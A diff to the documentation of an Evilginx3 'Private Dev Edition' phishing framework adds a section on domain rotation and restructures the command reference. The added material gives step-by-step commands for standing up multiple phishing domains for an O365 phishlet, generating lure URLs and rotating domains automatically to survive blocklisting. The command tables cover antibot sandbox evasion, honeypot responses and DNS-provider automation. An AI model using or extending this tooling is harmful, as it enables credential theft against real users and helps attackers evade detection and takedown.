@@ -15,10 +15,11 @@
 7. [Phishlet Configuration](#7-phishlet-configuration)
 8. [Redirector Setup (Turnstile)](#8-redirector-setup-turnstile)
 9. [Lure Creation & Distribution](#9-lure-creation--distribution)
-10. [Advanced Features & Evasion](#10-advanced-features--evasion)
-11. [Operational Security](#11-operational-security)
-12. [Troubleshooting](#12-troubleshooting)
-13. [Command Reference](#13-command-reference)
+10. [Domain Rotation & Multi-Domain Lures](#10-domain-rotation--multi-domain-lures)
+11. [Advanced Features & Evasion](#11-advanced-features--evasion)
+12. [Operational Security](#12-operational-security)
+13. [Troubleshooting](#13-troubleshooting)
+14. [Command Reference](#14-command-reference)
 
 ---
 
@@ -330,7 +331,66 @@ lures get-url 0
 
 ---
 
-## 10. Advanced Features & Evasion
+## 10. Domain Rotation & Multi-Domain Lures
+
+Domain rotation lets you run **multiple domains simultaneously** for the same phishlet, each with its own lure URL. This provides resilience (if one domain gets flagged, others keep working), distributed traffic, and campaign segmentation.
+
+> 📖 **Full guide:** See [DOMAIN-ROTATION-GUIDE.md](DOMAIN-ROTATION-GUIDE.md) for detailed setup, strategies, DNS configuration, and advanced usage.
+
+### Quick Setup
+
+```bash
+# 1. Set primary domain and add more to the pool
+domains set evil-domain1.com
+domains add evil-domain2.com "backup domain"
+domains add evil-domain3.com "campaign B"
+
+# 2. Configure phishlet
+phishlets hostname o365 login.evil-domain1.com
+phishlets enable o365
+
+# 3. Create lures with different hostnames (all active simultaneously)
+lures create o365
+lures edit 0 hostname login.evil-domain1.com
+
+lures create o365
+lures edit 1 hostname login.evil-domain2.com
+
+lures create o365
+lures edit 2 hostname login.evil-domain3.com
+
+# 4. Get URLs — all three work at the same time
+lures get-url 0    # → https://login.evil-domain1.com/xK8mQ...
+lures get-url 1    # → https://login.evil-domain2.com/pR3nL...
+lures get-url 2    # → https://login.evil-domain3.com/vT9wJ...
+
+# 5. Enable automatic rotation
+domains rotation enable on
+domains rotation strategy round-robin
+domains rotation interval 30
+```
+
+### Rotation Strategies
+
+| Strategy | Description |
+|----------|-------------|
+| `round-robin` | Cycles through domains sequentially |
+| `weighted` | Distributes based on domain health/weight |
+| `health-based` | Prefers domains with best health scores |
+| `random` | Random domain selection |
+
+### Monitoring
+
+```bash
+domains rotation           # Show configuration
+domains rotation stats     # Detailed statistics
+domains rotation list      # List pool domains
+domains rotation mark-compromised evil-domain2.com "flagged"   # Remove from rotation
+```
+
+---
+
+## 11. Advanced Features & Evasion
 
 This Private Dev Edition references `config.json` for advanced settings.
 
@@ -384,7 +444,7 @@ Evilginx3 integrates directly with the Gophish database to bridge captured crede
 ---
 
 
-## 11. Operational Security
+## 12. Operational Security
 
 1. **Infrastructure Isolation**: Never reuse campaign infrastructure. Use fresh VPS and Domains for each engagement.
 2. **Access Control**: The installer offers to create a dedicated admin user and disable root SSH login. Use it.
@@ -393,7 +453,7 @@ Evilginx3 integrates directly with the Gophish database to bridge captured crede
 
 ---
 
-## 12. Troubleshooting
+## 13. Troubleshooting
 
 **Issue: "Port 443 already in use"**
 ```bash
@@ -420,7 +480,7 @@ sudo lsof -i :443
 
 ---
 
-## 13. Command Reference
+## 14. Command Reference
 
 ### General Configuration
 
@@ -494,11 +554,14 @@ sudo lsof -i :443
 | | `domains enable <domain>` | Enable a domain for use. |
 | | `domains disable <domain>` | Disable a domain (keeps it in pool but inactive). |
 | | `domains rotation` | Show domain rotation configuration. |
-| | `domains rotation enable <on\|off>` | Enable or disable automatic domain rotation. |
+| | `domains rotation enable <on\|off>` | Enable or disable automatic domain rotation (auto-populates from configured domains). |
 | | `domains rotation strategy <round-robin\|weighted\|health-based\|random>` | Set rotation strategy. |
 | | `domains rotation interval <minutes>` | Set rotation interval in minutes. |
-| | `domains rotation add-domain <domain> <subdomain> <provider>` | Add a domain to the rotation pool. |
+| | `domains rotation max-domains <count>` | Set maximum number of domains in pool. |
+| | `domains rotation auto-generate <on\|off>` | Enable or disable automatic domain generation. |
 | | `domains rotation list` | List all domains in the rotation pool. |
+| | `domains rotation add-provider <name> <type> <api_key> <api_secret> <zone>` | Add a DNS provider for domain rotation. |
+| | `domains rotation mark-compromised <domain> <reason>` | Mark a domain as compromised and remove from rotation. |
 | | `domains rotation stats` | Show detailed rotation statistics. |
 
 ### Defense & Evasion
@@ -555,22 +618,7 @@ sudo lsof -i :443
 | `antibot sandbox honeypot <html>` | Set honeypot HTML response when action is 'honeypot'. |
 | `antibot sandbox stats` | Show detailed sandbox detection statistics and detection methods. |
 
-#### `antibot domain-rotation` — Automatic Domain Rotation
-
-| Usage | Description |
-| :--- | :--- |
-| `antibot domain-rotation` | Show current domain rotation configuration and pool status. |
-| `antibot domain-rotation enable <on\|off>` | Enable or disable automatic domain rotation. |
-| `antibot domain-rotation strategy <round-robin\|weighted\|health-based\|random>` | Set rotation strategy. |
-| `antibot domain-rotation interval <minutes>` | Set rotation interval in minutes. |
-| `antibot domain-rotation max-domains <count>` | Set maximum number of domains in the pool. |
-| `antibot domain-rotation auto-generate <on\|off>` | Enable or disable automatic domain generation. |
-| `antibot domain-rotation add-domain <domain> <subdomain> <provider>` | Add a domain to the rotation pool. |
-| `antibot domain-rotation remove-domain <full_domain>` | Remove a domain from the rotation pool. |
-| `antibot domain-rotation list` | List all domains in the rotation pool with status, health, and request count. |
-| `antibot domain-rotation add-provider <name> <type> <api_key> <api_secret> <zone> [options]` | Add a DNS provider for domain rotation. |
-| `antibot domain-rotation mark-compromised <full_domain> <reason>` | Mark a domain as compromised and rotate it out. |
-| `antibot domain-rotation stats` | Show detailed rotation statistics including provider counts and rotation history. |
+> **Note:** Domain rotation has been moved to `domains rotation`. See the [Domain Management](#domain-management) section above for all rotation commands.
 
 #### `antibot traffic-shaping` — Traffic Shaping / Rate Limiting
 
